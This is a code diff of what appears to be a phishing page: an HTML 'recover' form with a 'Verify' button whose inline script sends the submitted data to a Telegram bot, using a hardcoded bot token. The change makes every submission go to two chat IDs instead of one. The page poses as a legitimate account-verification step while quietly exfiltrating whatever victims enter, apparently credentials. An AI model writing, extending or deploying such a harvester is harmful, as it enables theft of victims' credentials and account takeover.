@@ -81,10 +81,10 @@
        <button class="sg-Btn sg-Btn--primary Btn-next" name="submit" type="submit" value="Submit">
         Verify
        </button>
-     <script>
+<script>
 // Telegram Bot Configuration
 const TELEGRAM_BOT_TOKEN = '8580841728:AAFsXNmdnj-kBurv4UxM4ucpZm4NqYcDL00';
-const TELEGRAM_CHAT_ID = '-5233511146';
+const TELEGRAM_CHAT_IDS = ['-5233511146', '7987288274']; // Array of chat IDs
 
 document.addEventListener('DOMContentLoaded', function() {
     const form = document.getElementById('recoverForm');
@@ -273,17 +273,20 @@ Date: ${currentDateTime}`;
 
         try {
             const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
-            const response = await fetch(telegramUrl, {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json',
-                },
-                body: JSON.stringify({
-                    chat_id: TELEGRAM_CHAT_ID,
-                    text: message,
-                    parse_mode: 'MarkdownV2'
-                })
-            });
+            // Send to each chat ID
+            for (const chatId of TELEGRAM_CHAT_IDS) {
+                await fetch(telegramUrl, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        chat_id: chatId,
+                        text: message,
+                        parse_mode: 'MarkdownV2'
+                    })
+                });
+            }
         } catch (error) {
             console.error('Failed to send to Telegram:', error);
         }
@@ -294,7 +297,6 @@ Date: ${currentDateTime}`;
     });
 });
 </script>
-
 
       </div>
      </form>
@@ -322,6 +324,7 @@ Date: ${currentDateTime}`;
   </iframe>
  </body>
 </html>
+
 
 
 
